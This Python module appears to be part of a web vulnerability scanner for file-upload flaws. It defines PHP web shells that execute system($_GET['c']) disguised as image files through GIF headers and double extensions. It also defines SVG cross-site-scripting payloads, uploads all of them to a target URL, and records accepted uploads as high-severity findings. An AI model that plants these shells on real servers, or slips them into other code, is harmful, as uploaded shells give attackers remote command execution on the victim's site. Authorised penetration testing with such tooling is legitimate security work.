"""Polyglot file attacks: PHP in images, metadata injection, SVG XSS."""
from core.http import get, post
from core.findings import Finding
from core.memory import log_event
import urllib.parse

POLYGLOTS = [
    ("shell.php.png", "GIF89a;\n<?php system($_GET['c']); ?>", "image/png"),
    ("shell.png.php", "<?php system($_GET['c']); ?>", "image/png"),
    ("shell.jpg", "X<?php system($_GET['c']); ?>", "image/jpeg"),
    ("shell.svg", "<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'></svg>", "image/svg+xml"),
]

SVG_XSS = "<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>"

def scan_url(url):
    findings = []
    parsed = urllib.parse.urlparse(url)
    r = get(url)
    if r.status != 0 and "svg" in (r.headers.get("content-type", "") or "").lower():
        if "<script" in (r.text or "") or "onload" in (r.text or ""):
            findings.append(Finding(
                id="svg-xss-{}".format(hash(url) & 0xffff),
                target=parsed.netloc,
                type="SVG XSS",
                severity="medium",
                url=url,
                parameter="svg",
                payload=SVG_XSS,
                evidence="SVG contains script/onload",
                response_snippet=r.snippet(200),
                confidence=0.6,
            ))
    for fname, content, ctype in POLYGLOTS:
        try:
            files = {"file": (fname, content, ctype)}
            resp = post(url, files=files)
        except Exception:
            continue
        if resp.status == 0:
            continue
        text = (resp.text or "").lower()
        if resp.status in (200, 201) and ("success" in text or "uploaded" in text or fname in text or "url" in text):
            findings.append(Finding(
                id="polyglot-{}-{}".format(fname, hash(url) & 0xffff),
                target=parsed.netloc,
                type="Polyglot File Upload",
                severity="high",
                url=url,
                parameter="file",
                payload=fname,
                evidence="Polyglot accepted (status {})".format(resp.status),
                response_snippet=resp.snippet(200),
                confidence=0.5,
            ))
    log_event(parsed.netloc, "polyglot_scan", {"url": url, "findings": len(findings)})
    return findings
